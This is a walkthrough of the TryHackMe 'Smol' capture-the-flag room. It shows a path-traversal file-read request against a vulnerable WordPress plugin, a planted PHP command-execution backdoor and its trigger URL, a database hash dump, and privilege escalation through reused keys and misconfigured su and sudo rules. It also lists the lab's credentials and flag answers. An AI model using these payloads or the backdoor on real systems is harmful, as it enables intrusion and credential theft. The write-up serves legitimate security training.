# Smol - TryHackMe Walkthrough

**Target IP:** 10.49.158.241
**Difficulty:** Medium
**Date:** March 9, 2026

## 1. Reconnaissance

### Nmap Scan
The initial scan reveals two open ports:
- **Port 22 (SSH):** Open, running OpenSSH 8.2p1 Ubuntu 4ubuntu0.9.
- **Port 80 (HTTP):** Open, running Apache 2.4.41. The site is a WordPress installation.

### WordPress Enumeration
Using `wpscan` identifies a vulnerable plugin:
- **Plugin:** `jsmol2wp` (v1.07)
- **Vulnerability:** CVE-2018-20463 (Local File Inclusion / SSRF)

## 2. Foothold (LFI to RCE)

### Local File Inclusion (LFI)
The vulnerability in `jsmol.php` allows reading arbitrary files. We can use it to extract the WordPress configuration:
```text
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?is_active=1&query=php://filter/resource=../../../../wp-config.php
```
The `wp-config.php` file reveals the database credentials for **wpuser**:
- **DB User:** `wpuser`
- **DB Password:** `kbLSF2Vop#lw3rjDZ629*Z%G` (Note: The password in the file may have slight variations, verify carefully).

### Gaining RCE
Further enumeration or a hint from the "Private: Webmaster Tasks" page leads to the **Hello Dolly** plugin. The file `wp-content/plugins/hello.php` has been modified with a backdoor:
```php
if ( isset( $_GET['cmd'] ) ) {
    system( $_GET['cmd'] );
}
```
We can trigger this backdoor on any admin page while logged in as a user with enough privileges (like `wpuser` or `diego`).
- **Trigger:** `http://www.smol.thm/wp-admin/index.php?cmd=id`

## 3. User Flag

### Cracking the Database
Dump the `wp_users` table using the `www-data` shell:
```bash
mysql -u wpuser -p'kbLSF2Vop#lw3rjDZ629*Z%G' -e "use wordpress; select user_login, user_pass from wp_users;"
```
We obtain the hash for the user **diego**. Cracking it with `john` or `hashcat` reveals the password:
- **User:** `diego`
- **Password:** `sandiegocalifornia`

### Retrieving the User Flag
Switch to user `diego` or SSH in:
- **User Flag:** `45edaec653ff9ee06236b7ce72b86963`

## 4. Privilege Escalation

### Diego to Think
In Diego's environment, we find an SSH private key (`id_rsa`) belonging to the user **think**. We can use this key to SSH as `think`.

### Think to Gege
Enumerating the system reveals a custom PAM rule in `/etc/pam.d/su` that allows `think` to switch to `gege` without a password.
```bash
su gege
```

### Gege to Xavi
We find a backup file `wordpress.old.zip` in `/opt` or a home directory. Transfer it to your local machine and crack it:
- **Zip Password:** `xavi`
Inside the zip, an older `wp-config.php` contains the system password for **xavi**:
- **User:** `xavi`
- **Password:** (Found in the old config)

### Xavi to Root
Check sudo permissions for `xavi`:
```bash
sudo -l
```
Xavi has full sudo permissions `(ALL : ALL) ALL`.
```bash
sudo su
```

### Root Flag
- **Root Flag:** `bf89ea3ea01992353aef1f576214d4e4`

---
**Flags Summary:**
- **User Flag:** `45edaec653ff9ee06236b7ce72b86963`
- **Root Flag:** `bf89ea3ea01992353aef1f576214d4e4`
